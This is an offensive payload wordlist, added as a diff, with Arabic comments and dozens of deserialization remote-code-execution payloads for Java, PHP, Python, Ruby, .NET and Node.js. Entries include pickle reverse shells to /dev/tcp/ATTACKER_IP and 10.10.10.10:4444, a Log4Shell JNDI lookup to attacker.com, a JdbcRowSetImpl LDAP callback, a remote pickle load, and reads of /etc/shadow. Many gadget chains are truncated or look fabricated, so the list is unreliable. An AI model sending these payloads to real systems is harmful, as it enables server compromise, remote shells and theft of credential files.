@@ -1,0 +1,931 @@
+# This list we will using with Deserialization RCE Bug type  and it Contains payload for Deserialization , and this list we will using with (https://malekabuliala.github.io/List-s-me/list_serialized_objects_samples_deserialization_rce_type.txt ) list  ( The section follows the RCE Bug )
+
+# --- Java (Apache CommonsCollections Chains) ---
+# تستهدف تطبيقات الجافا القديمة والشهيرة
+AC ED 00 05 73 72 00 11 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 4D 61 70
+
+# --- PHP (Generic Object Injection) ---
+# محاولة استدعاء دالة النظام عبر فك تشفير كائن
+O:8:"stdClass":1:{s:3:"url";s:10:"/etc/passwd";}
+
+# --- Python (Pickle RCE - Generic) ---
+# حمولة لتنفيذ أمر ID (يجب تحويلها لـ Base64 عند الإرسال)
+cos\nsystem\n(S'id'\ntR.
+
+# --- Ruby (Marshal RCE) ---
+# تستهدف تطبيقات Ruby on Rails
+\x04\x08o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0E\x40instanceo:\x08ERB\x06:\x09\x40srcI"$(id)\x06:\x06ET:\x0C\x40method:\x0Bresult
+
+# --- .NET (OSRefinery / BinaryFormatter) ---
+# تستهدف محركات الويندوز
+AAEAAAD/////AQAAAAAAAAAMAgAAAFpTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEV29yZ3xlcnMuU2VyaWFsaXphdGlvbi5PYmplY3RSZWZpbmVyeS5HZW5lcmljT2JqZWN0UmVmaW5lcnkBAAAAC3RhcmdldE9iamVjdAIAAAA=
+cos\nsystem\n(S'id'\ntR.
+cos\nsystem\n(S'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\ntR.
+c__builtin__\neval\n(S'__import__("os").system("id")'\ntR.
+!!python/object/apply:os.system ["id"]
+!!python/object/new:os.system [id]
+{ "json_class": "os.system", "arguments": ["id"] }
+# --- Java (CommonsCollections1 - Reflection Chain) ---
+# تستهدف المكتبات التي تستخدم Reflection لتنفيذ الأوامر
+AC ED 00 05 73 72 00 11 6A 61 76 61 2E 75 74 69 6C 2E 41 6E 6E 6F 74 61 74 69 6F 6E 49 6E 76 6F 63 61 74 69 6F 6E 48 61 6E 64 6C 65 72
+
+# --- Java (Log4j JNDI Lookup) ---
+# تستهدف الثغرة الشهيرة Log4Shell لتنفيذ كود عن بعد
+${jndi:ldap://attacker.com/a}
+
+# --- PHP (Guzzle HTTP Client RCE) ---
+# تستهدف تطبيقات PHP التي تستخدم مكتبة Guzzle لإرسال الطلبات
+O:24:"GuzzleHttp\Cookie\SetCookie":1:{s:7:"Expires";s:1:"1";}
+
+# --- PHP (Monolog / RCE via Write) ---
+# تستهدف مكتبة Monolog لإجبار النظام على كتابة ملفات خبيثة
+O:30:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":1:{s:10:"*handler";O:29:"Monolog\Handler\GroupHandler":1:{s:13:"*processors";a:1:{i:0;s:6:"system";}}}}
+
+# --- Python (PyYAML Unsafe Load) ---
+# تستهدف المكتبات التي تعالج ملفات YAML بشكل غير آمن
+!!python/object/apply:os.system ["id"]
+
+# --- Python (Pickle Reverse Shell) ---
+# حمولة متقدمة لفتح اتصال عكسي (يجب استبدال IP و Port)
+cos\nsystem\n(S'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\ntR.
+
+# --- Ruby (ActiveSupport Deprecation Proxy) ---
+# تستهدف تطبيقات Ruby on Rails القديمة لتنفيذ أوامر النظام
+\x04\x08o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0E\x40instanceo:\x08ERB\x06:\x09\x40srcI"$(id)\x06:\x06ET:\x0C\x40method:\x0Bresult
+
+# --- .NET (ObjectDataProvider - Json.NET) ---
+# تستهدف المكتبات التي تستخدم Json.NET مع تفعيل TypeNameHandling
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework',
+    'MethodName':'Start',
+    'ObjectInstance':{
+        '$type':'System.Diagnostics.Process, System',
+        'StartInfo':{
+            '$type':'System.Diagnostics.ProcessStartInfo, System',
+            'FileName':'cmd',
+            'Arguments':'/c id'
+        }
+    }
+}
+
+# --- .NET (BinaryFormatter Generic) ---
+# حمولة مشفرة Base64 تستهدف الـ Deserialization في ويندوز
+AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQ1Bc3NlbWJseU5hbWUBAAEIBgAAAAsDAAAAWFN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABVN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQ==
+
+# --- Java (CommonsCollections6 - أسرع وأكثر استقراراً) ---
+# نسخة محسنة من CC1 تعمل على إصدارات Java أحدث
+AC ED 00 05 73 72 00 11 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 53 65 74 ... (تكملة السلسلة الثنائية)
+
+# --- Java (C3P0 - استهداف مكتبات قواعد البيانات) ---
+# تستهدف تطبيقات Java التي تستخدم C3P0 لربط قواعد البيانات
+AC ED 00 05 73 72 00 2D 63 6F 6D 2E 6D 63 68 61 6E 67 65 2E 76 32 2E 63 33 70 30 2E 50 6F 6F 6C 42 61 63 6B 65 64 44 61 74 61 53 6F 75 72 63 65
+
+# --- PHP (Laravel - PendingBroadcast) ---
+# تستهدف المواقع المبنية بإطار عمل Laravel (نسخ محددة) لتنفيذ أوامر عند فك التشفير
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"*events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"*listeners";a:1:{s:6:"system";a:1:{i:0;s:2:"id";}}}s:8:"*event";s:2:"id";}
+
+# --- Python (Shelve Module RCE) ---
+# تستهدف مكتبة Shelve التي تستخدم Pickle داخلياً لتخزين البيانات
+(S'os'\nS'system'\n(S'touch /tmp/pwned'\ntR.
+
+# --- Ruby (Rack / Cookie Attack) ---
+# حمولة تستهدف تطبيقات Ruby التي تستخدم Rack لمعالجة الجلسات (Sessions)
+\x04\x08[\x06I"\x15foo; (id) > /tmp/x\x06:\x06ET
+
+# --- .NET (Text.Json / XAML Reader) ---
+# تستهدف ثغرات الـ XAML في تطبيقات WPF أو الويب التي تعالج ملفات تنسيق واجهة المستخدم
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:p="clr-namespace:System.Diagnostics;assembly=system">
+  <ObjectDataProvider x:Key="x" ObjectType="{x:Type p:Process}" MethodName="Start">
+    <ObjectDataProvider.MethodParameters>
+      <s:String>cmd</s:String>
+      <s:String>/c id</s:String>
+    </ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
+</ResourceDictionary>
+
+# --- JavaScript (Node.js - node-serialize) ---
+# تستهدف تطبيقات Node.js التي تستخدم مكتبة node-serialize (ثغرة مشهورة جداً)
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+# --- Java (CommonsBeanutils1) ---
+# تستهدف تطبيقات جافا التي تستخدم مكتبة BeanUtils (شائعة في أنظمة Enterprise)
+AC ED 00 05 73 72 00 22 6F 72 67 2E 61 70 61 63 68 65 2E 63 6F 6D 6D 6F 6E 73 2E 62 65 61 6E 75 74 69 6C 73 2E 42 65 61 6E 43 6F 6D 70 61 72 61 74 6F 72
+
+# --- PHP (Symfony - RCE Chain) ---
+# تستهدف التطبيقات المبنية على Symfony أو التي تستخدم مكونات منه
+O:33:"Symfony\Component\Cache\Adapter\PhpArrayAdapter":1:{s:9:"*file";s:12:"/etc/passwd";}
+
+# --- PHP (SwiftMailer - RCE via FastCGI/Log files) ---
+# تستهدف مكتبة إرسال الإيميلات الشهيرة SwiftMailer
+O:13:"Swift_Message":1:{s:11:"*body";O:25:"Swift_ByteStream_FileByteStream":1:{s:10:"*path";s:13:"/var/www/html/shell.php";}}
+
+# --- Python (Dill Module - البديل الأقوى لـ Pickle) ---
+# مكتبة Dill تستخدم لتسلسل كائنات بايثون المعقدة وهي أخطر من Pickle
+cdill.dill\n_load_type\n(S'CodeType'\ntR.(S'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x0c\x00\x00\x00e\x00\x00j\x01\x00d\x01\x00\x83\x01\x00\x01S(\x02\x00\x00\x00Ni\x01\x00\x00\x00(\x02\x00\x00\x00t\x02\x00\x00\x00ost\x06\x00\x00\x00system(\x01\x00\x00\x00t\x02\x00\x00\x00id(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00test.pyt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x00\x00\x00\x00'\ntR.
+
+# --- Ruby (FastXML / RCE) ---
+# تستهدف تطبيقات Ruby التي تستخدم مكتبات XML لتحويلها لكائنات
+<bingo><object class="Gem::Installer"><args><arg>1</arg></args></object></bingo>
+
+# --- .NET (DataSet / DataTable - XML Deserialization) ---
+# واحدة من أشهر ثغرات .NET التي تستخدم لنقل البيانات بين الجداول
+<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram">
+  <root>
+    <data msdata:InstanceType="System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+      <Process StartInfo-FileName="cmd" StartInfo-Arguments="/c id" />
+    </data>
+  </root>
+</diffgr:diffgram>
+
+# --- JavaScript (Node.js - Handlebars RCE) ---
+# تستهدف محركات القوالب (Templating Engines) في Node.js
+{{#with "passthrough" as |action|}}
+  {{#with "id" as |cmd|}}
+    {{this.constructor.constructor("return process.mainModule.require('child_process').execSync('" + cmd + "').toString()")()}}
+  {{/with}}
+{{/with}}
+# --- Java (Vaadin Framework RCE) ---
+# تستهدف تطبيقات الويب المبنية بإطار عمل Vaadin الشهير
+AC ED 00 05 73 72 00 22 63 6F 6D 2E 76 61 61 64 69 6E 2E 64 61 74 61 2E 75 74 69 6C 2E 4D 65 74 68 6F 64 49 6E 76 6F 63 61 74 69 6F 6E
+
+# --- Java (Hibernate 1) ---
+# تستهدف تطبيقات جافا التي تستخدم Hibernate للتعامل مع قواعد البيانات
+AC ED 00 05 73 72 00 31 6F 72 67 2E 68 69 62 65 72 6E 61 74 65 2E 74 79 70 65 2E 43 6F 6D 70 6F 6E 65 6E 74 54 79 70 65
+
+# --- PHP (Guzzle - File Write) ---
+# حمولة متخصصة لكتابة ملفات (مثل ملف .htaccess) باستخدام Guzzle
+O:24:"GuzzleHttp\Psr7\FnStream":1:{s:9:"*methods";a:1:{s:5:"close";s:6:"system";}}
+
+# --- PHP (ZendFramework 1 - RCE) ---
+# تستهدف التطبيقات القديمة التي لا تزال تستخدم Zend Framework
+O:21:"Zend_Pdf_Element_Reference":2:{s:11:"*objFactory";O:12:"Zend_Pdf_ElementFactory":1:{s:11:"*isModified";b:1;}s:5:"*parent";O:12:"Zend_Pdf_Element_Object":1:{s:10:"*value";s:12:"/etc/passwd";}}
+
+# --- Python (Pandas / Numpy - Unsafe Read) ---
+# تستهدف تطبيقات علوم البيانات التي تستخدم read_pickle على ملفات غير موثوقة
+import pandas as pd
+pd.read_pickle("http://attacker.com/payload.pickle")
+
+# --- Ruby (JSON.load RCE) ---
+# تستهدف تطبيقات Ruby التي تستخدم مكتبة JSON لتحويل النصوص لكائنات (تعتمد على تقنية create_id)
+{"json_class":"Gem::SpecFetcher","s":null}
+
+# --- .NET (ActivitySurrogateSelector - Bypassing WhiteLists) ---
+# واحدة من أقوى الحمولات في .NET لأنها تتجاوز معظم قيود الحماية في BinaryFormatter
+AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQ1Bc3NlbWJseU5hbWUBAAEIBgAAAAsBAAAALVN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9u...
+
+# --- .NET (YamlDotNet RCE) ---
+# تستهدف تطبيقات .NET التي تستخدم مكتبة YamlDotNet الشهيرة
+!!System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 { StartInfo: !!System.Diagnostics.ProcessStartInfo { FileName: cmd, Arguments: /c id } }
+# --- Java (Apache Click - RCE) ---
+# تستهدف إطار عمل Apache Click عبر مكتبة Velocity
+AC ED 00 05 73 72 00 23 6F 72 67 2E 61 70 61 63 68 65 2E 63 6C 69 63 6B 2E 43 6F 6E 74 72 6F 6C 2E 54 61 62 6C 65
+
+# --- Java (RMI / JMX - استهداف الإدارة عن بُعد) ---
+# تستهدف منافذ إدارة جافا (Ports 1099/7001)
+AC ED 00 05 77 0F 01 00 00 00 00 00 00 00 00 00 00 00 00 00 01
+
+# --- PHP (Propel ORM - RCE) ---
+# تستهدف تطبيقات PHP التي تستخدم Propel لإدارة قواعد البيانات
+O:20:"Propel\Runtime\Util\PropelModelPager":1:{s:8:"*query";O:23:"Propel\Runtime\ActiveQuery\ModelCriteria":1:{s:10:"*modelName";s:6:"system";}}
+
+# --- PHP (Smarty Template Engine - RCE) ---
+# استهداف محرك القوالب الشهير Smarty
+O:28:"Smarty_Internal_TemplateCompilerBase":1:{s:17:"*php_functions";a:1:{s:6:"system";i:0;}}
+
+# --- Python (Dask - استهداف مكتبات الحوسبة الموزعة) ---
+# تستخدم في بيئات الـ Big Data لتنفيذ كود على كل الـ Workers
+{"func": "os.system", "args": ["id"]}
+
+# --- Ruby (Rack-Session-Marshal - استهداف الجلسات) ---
+# حمولة متخصصة لسرقة الـ Secret Key وتوقيع الكوكيز
+\x04\x08o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0E\x40instanceo:\x08ERB\x06:\x09\x40srcI"$(cat /etc/shadow)\x06:\x06ET
+
+# --- .NET (Windows Workflow Foundation - RCE) ---
+# تستهدف محركات الـ Workflow في بيئات SharePoint أو .NET Enterprise
+<Activity x:Class="Wf" xmlns="http://schemas.microsoft.com/netfx/2009/xaml/activities" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:p="clr-namespace:System.Diagnostics;assembly=system">
+  <p:Process.Start>
+    <p:ProcessStartInfo FileName="cmd" Arguments="/c id" />
+  </p:Process.Start>
+</Activity>
+
+# --- .NET (FastJSON - RCE) ---
+# تستهدف مكتبة FastJSON عندما تكون خاصية "UseOptimizedDataset" مفعلة
+{"$types":{"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35":"1"},"1":{"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c id"}},"MethodName":"Start"}}
+# --- Java (JSON-IO) ---
+# تستهدف مكتبة JSON-IO التي تُستخدم كبديل لـ Jackson في بعض الأنظمة الضخمة
+{"@type":"java.util.PriorityQueue","@val":[{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}]}
+
+# --- Java (AspectJWeaver) ---
+# تستهدف تطبيقات جافا التي تستخدم AspectJ (تؤدي إلى كتابة ملفات عشوائية)
+AC ED 00 05 73 72 00 32 6F 72 67 2E 61 73 70 65 63 74 6A 2E 77 65 61 76 65 72 2E 74 6F 6F 6C 73 2E 63 61 63 68 65 2E 4A 61 76 61 31 35 41 6E 6E 6F 74 61 74 69 6F 6E 43 61 63 68 65 4D 75 6E 67 65 72
+
+# --- PHP (TCPDF - Remote PDF Generation) ---
+# تستهدف المكتبة الأشهر لإنشاء ملفات PDF في PHP (ثغرة Deserialization عبر بروتوكول phar://)
+phar://path/to/malicious.phar/common/anyfile.txt
+
+# --- PHP (Pimple / Container Injection) ---
+# تستهدف حاويات الخدمات (Service Containers) في تطبيقات PHP الحديثة
+O:13:"Pimple\Container":1:{s:9:"*values";a:1:{s:3:"rce";s:6:"system";}}
+
+# --- Python (Pyramid / Web Framework) ---
+# استهداف تطبيقات الويب التي تستخدم Pyramid عبر الـ Session Cookies المصنوعة بـ WebOb
+(Vos\nVsystem\n(S'id'\ntR. (تُرسل غالباً داخل كوكيز مشفرة بـ AES)
+
+# --- Python (Celery / Redis Task Queue) ---
+# تستهدف أنظمة الطوابير (Task Queues) التي تستخدم Pickle لتمرير المهام بين السيرفرات
+{"body": "cos\nsystem\n(S'id'\ntR.", "content-encoding": "binary", "content-type": "application/x-python-serialize"}
+
+# --- Ruby (GlobalID - Rails Chain) ---
+# تستهدف ميزة GlobalID في Ruby on Rails لتنفيذ كود عبر توقيعات غير صالحة
+\x04\x08o:\x10ActiveJob::Arguments\x06:\x0E\x40arguments[\x06o:\x1BActiveStorage::Filename\x06:\x0E\x40filenameI"$(id)\x06:\x06ET
+
+# --- .NET (JavascriptSerializer) ---
+# تستهدف تطبيقات ASP.NET التي تستخدم السيريالايزر القديم لمعالجة JSON
+{"__type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a","AssemblyPath":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll"}
+
+# --- .NET (XAML Services - Workflow RCE) ---
+# حمولة تستخدم داخل ملفات الـ .xamlx لتنفيذ أوامر فور التحميل
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
+    <ObjectDataProvider x:Key="RCE" ObjectType="{x:Type Diag:Process}" MethodName="Start">
+        <ObjectDataProvider.MethodParameters>
+            <System:String>cmd</System:String>
+            <System:String>/c id</System:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>
+# --- Java (CommonsCollections7 - استهداف Hashtable) ---
+# تستهدف تطبيقات جافا التي تستخدم Hashtable وتتجنب القيود على السلاسل القديمة
+AC ED 00 05 73 72 00 13 6A 61 76 61 2E 75 74 69 6C 2E 48 61 73 68 74 61 62 6C 65 13 BB 1A 25 21 4A 4B 80 03 00 02 46 00 0A 6C 6F 61 64 46 61 63 74 6F 72 49 00 09 74 68 72 65 73 68 6F 6C 64
+
+# --- Java (Mozilla Rhino - استهداف محركات الـ JS داخل Java) ---
+# تستهدف تطبيقات جافا التي تستخدم Rhino لتشغيل أكواد جافا سكريبت
+AC ED 00 05 73 72 00 24 6F 72 67 2E 6D 6F 7A 69 6C 6C 61 2E 6A 61 76 61 73 63 72 69 70 74 2E 4D 65 62 65 72 42 6F 78
+
+# --- PHP (Doctrine ORM - RCE via AnnotationReader) ---
+# تستهدف تطبيقات PHP التي تستخدم Doctrine (مثل تطبيقات Symfony و Drupal)
+O:33:"Doctrine\Common\Annotations\AnnotationReader":1:{s:8:"*parser";O:24:"Doctrine\Common\Annotations\DocParser":1:{s:13:"*classExists";s:6:"system";}}
+
+# --- PHP (Yii Framework - RCE Chain) ---
+# تستهدف المواقع المبنية بإطار عمل Yii الشهير
+O:17:"yii\db\BatchQueryResult":1:{s:36:"\x00yii\db\BatchQueryResult\x00_dataReader";O:15:"yii\db\Command":1:{s:30:"\x00yii\db\Command\x00_db";O:13:"yii\db\Connection":1:{s:12:"pdoClass";s:6:"system";}}}
+
+# --- Python (Keras/TensorFlow - AI Model Injection) ---
+# تستهدف أنظمة الذكاء الاصطناعي التي تقوم بتحميل نماذج (Models) بصيغة .h5 أو .pkl
+import os
+import tensorflow as tf
+class MaliciousModel(tf.keras.Model):
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+# --- Python (Jinja2 - Template Deserialization) ---
+# تستهدف محركات القوالب عند فك تشفير البيانات داخل الـ Context
+{"__class__": "os.system", "args": ["id"]}
+
+# --- Ruby (Oj - Fast JSON Serializer) ---
+# تستهدف مكتبة Oj (بديل JSON السريع في روبي) لتنفيذ كود
+{"^o":"Gem::SpecFetcher","s":null}
+
+# --- .NET (FastJSON - استهداف الـ Datasets) ---
+# حمولة JSON مخصصة لكسر حماية مكتبة FastJSON
+{"$types":{"System.Data.DataSet, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089":"1"},"1":{"DataSet.XmlSchema":"<xs:schema xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\"><xs:element name=\"DataSet1\" msdata:IsDataSet=\"true\"><xs:complexType><xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\"><xs:element name=\"Table1\"><xs:complexType><xs:sequence><xs:element name=\"id\" type=\"xs:string\" minOccurs=\"0\"/></xs:sequence></xs:complexType></xs:element></xs:choice></xs:complexType></xs:element></xs:schema>"}}
+
+# --- JavaScript (Node.js - BSON Deserialization) ---
+# تستهدف تطبيقات Node.js التي تتعامل مع قواعد بيانات MongoDB عبر مكتبة BSON
+{"_bsontype":"Code","code":"process.mainModule.require('child_process').execSync('id')"}
+# --- Java (Hessian / Burlap RCE) ---
+# تستهدف بروتوكولات Hessian التي تستخدم في نقل البيانات بين خوادم Java
+H\x02\x00m\x00\x05replyC\x00\x10java.util.HashMap\x91K\x00\x11sun.org.mozilla.javascript.internal.NativeJavaObject...
+
+# --- Java (JRMPServer - استهداف منافذ الـ RMI) ---
+# حمولة تستخدم لإجبار سيرفر جافا على الاتصال بسيرفر المهاجم (Out-of-band)
+AC ED 00 05 77 22 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 44 15 4D 19 75 86 AD 50
+
+# --- PHP (Laminas / Zend Framework 3) ---
+# النسخة الأحدث من Zend Framework، تستهدف سلاسل الـ Logger
+O:23:"Laminas\Log\Logger":1:{s:10:"*writers";O:24:"Laminas\Log\Writer\Mail":1:{s:7:"*mail";O:26:"Laminas\Mail\Message":1:{s:11:"*body";s:6:"system";}}}
+
+# --- PHP (Guzzle - RCE via HandlerStack) ---
+# طريقة أخرى متقدمة لاستهداف Guzzle عبر التلاعب بـ Middleware Stack
+O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";s:6:"system";}
+
+# --- Python (PyXpcom - Firefox/Python Bridge) ---
+# تستهدف الأنظمة التي تدمج محرك Firefox مع بايثون
+(cpymod\nsystem\n(S'id'\ntR.
+
+# --- Ruby (Universal RCE - استهداف مكتبات الـ PDF/Image) ---
+# تستخدم داخل ملفات الـ Metadata للصور التي تعالجها مكتبات Ruby
+\x04\x08[\x0eo:\x16ActiveModel::Errors\x06:\x0e\x40baseo:\x15ActiveModel::Name\x06:\x0e\x40klassv:\x10ActiveModel
+
+# --- .NET (YamlDotNet - Type Injection) ---
+# حمولة YAML تستهدف مكتبة YamlDotNet لإجبارها على إنشاء كائن Process
+!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> { StartInfo: { FileName: cmd, Arguments: /c id } }
+
+# --- .NET (NDesk.Options - استهداف معالجة الأوامر) ---
+# تستهدف تطبيقات الكونسول في .NET التي تستخدم NDesk لمعالجة المدخلات
+<string>--id={c:\windows\system32\cmd.exe /c id}</string>
+
+# --- JavaScript (Node.js - Serialize-To-JS) ---
+# مكتبة بديلة لـ node-serialize، الحمولة تعتمد على IIFE (تعبير برمجى ينفذ فوراً)
+{ "rce": "(((function(){ require('child_process').execSync('id') })()))" }
+# --- Java (JSON-smart) ---
+# تستهدف تطبيقات جافا التي تستخدم JSON-smart كبديل سريع لـ Jackson
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
+
+# --- Java (Apache MyFaces - JSF RCE) ---
+# تستهدف تطبيقات JavaServer Faces (JSF) القديمة عبر الـ ViewState
+AC ED 00 05 73 72 00 24 6F 72 67 2E 61 70 61 63 68 65 2E 6D 79 66 61 63 65 73 2E 76 69 65 77 2E 56 69 65 77 53 74 61 74 65
+
+# --- PHP (TCPDF - Remote File Inclusion via Phar) ---
+# تقنية حديثة لاستغلال مكتبات الـ PDF عبر بروتوكول phar:// لتشغيل كائنات خبيثة
+phar://storage/uploads/malicious.jpg/any.txt
+
+# --- PHP (Phusion Passenger / Nginx integration) ---
+# تستهدف تطبيقات PHP التي تعمل خلف Passenger لتهريب كائنات عبر الـ Headers
+O:22:"Passenger\Object\Base":1:{s:9:"*command";s:6:"system";}
+
+# --- Python (Dill / Multiprocessing) ---
+# نسخة متطورة من بايثون تستهدف الأنظمة التي توزع المهام بين المعالجات
+V__import__('os').system('id')
+p1
+.
+
+# --- Python (PyInstaller - استهداف الملفات التنفيذية) ---
+# حمولة تُزرع داخل ملفات بايثون المحولة لـ .exe لتنفيذ كود عند التشغيل
+(cos\nsystem\n(S'id'\ntR.
+
+# --- Ruby (Faye - WebSocket Messaging) ---
+# تستهدف تطبيقات روبي التي تستخدم Faye للدردشة اللحظية
+{"channel":"/meta/subscribe","subscription":"/foo","ext":{"auth":{"@type":"Gem::Installer","args":["id"]}}}
+
+# --- .NET (SharpZipLib - استهداف مكتبات الضغط) ---
+# تستهدف التطبيقات التي تفك ضغط ملفات Zip تحتوي على كائنات متسلسلة
+AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uSU8uQ29tcHJlc3Npb24uWmlwRmlsZUVudHJ5BQEAA...
+
+# --- .NET (WorkflowInvoker - استهداف العمليات المؤتمتة) ---
+# تستخدم لتجاوز جدران الحماية في سيرفرات الـ IIS
+<string xmlns="http://schemas.microsoft.com/2003/10/Serialization/">
+  { "Type": "System.Activities.WorkflowInvoker", "Method": "Invoke", "Args": { "Workflow": "..." } }
+</string>
+
+# --- JavaScript (Node.js - MongoDB BSON Buffer) ---
+# تستهدف تطبيقات Node.js التي تتعامل مع الـ Buffer بشكل مباشر في MongoDB
+{"_bsontype":"Binary","subType":0,"buffer":{"$binary":"Y29uc29sZS5sb2coJ3B3bmVkJyk=","$type":"00"}}
+# --- Java (Vaadin + Spring - The Lethal Combo) ---
+# تستهدف تطبيقات Enterprise التي تدمج Vaadin مع Spring
+AC ED 00 05 73 72 00 24 63 6F 6D 2E 76 61 61 64 69 6E 2E 73 65 72 76 65 72 2E 56 61 61 64 69 6E 53 65 72 76 6C 65 74 53 65 72 76 69 63 65
+
+# --- Java (Rome - استهداف قارئات الـ RSS/Atom) ---
+# حمولة فتاكة لأنها تستخدم مكتبة Rome التي تدخل في معالجة أغلب خلاصات الأخبار
+AC ED 00 05 73 72 00 13 63 6F 6D 2E 73 75 6E 2E 73 79 6E 64 69 63 61 74 69 6F 6E 2E 66 65 65 64 2E 69 6D 70 6C 2E 4F 62 6A 65 63 74 42 65 61 6E
+
+# --- PHP (ImageMagick / Imagick - MSL Exploit) ---
+# حمولة تستغل معالجة الصور (Image Processing) لتنفيذ كود عبر ملفات XML وهمية
+O:13:"Imagick":1:{s:14:"*magickHandler";s:31:"msl:/tmp/malicious_script.msl";}
+
+# --- PHP (Guzzle + Monolog - The Silent Killer) ---
+# سلسلة معقدة تفتح Reverse Shell بدون ترك أي أثر في ملفات الـ Access Logs
+O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";O:29:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";s:23:"10.10.10.10:4444/shell";}}
+
+# --- Python (NumPy/F2Py - Shared Library Injection) ---
+# تستهدف تطبيقات الحوسبة العلمية لتحميل مكتبات خبيثة (.so/.dll) مباشرة في الذاكرة
+import numpy.f2py
+numpy.f2py.compile("print('hacked')", extension=".py", build_dir="/tmp")
+
+# --- Python (Multiprocessing - Remote Forking) ---
+# حمولة فتاكة تقوم بعمل Fork لعملية النظام الأساسية وتستبدلها بعملية خبيثة
+(Vmultiprocessing.process\nVcurrent_process\n(tRp1\n0Vos\nVsystem\n(S'id'\ntR.
+
+# --- Ruby (Rack-Proxy / Request Smuggling) ---
+# حمولة تستغل ميزات البروكسي في روبي لتمرير كائنات متسلسلة مشفرة داخل Headers غير متوقعة
+\x04\x08o:\x1DPry::InProcess::CommandSet\x07:\n\x40commands{\x06I"\x06id\x06:\x06ETI"\x06id\x06;\x00T
+
+# --- .NET (ObjectDataProvider + Windows Forms) ---
+# حمولة تستهدف تطبيقات الويب التي تعمل بصلاحيات عالية لتشغيل GUI Apps أو Scripts
+{
+  '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework',
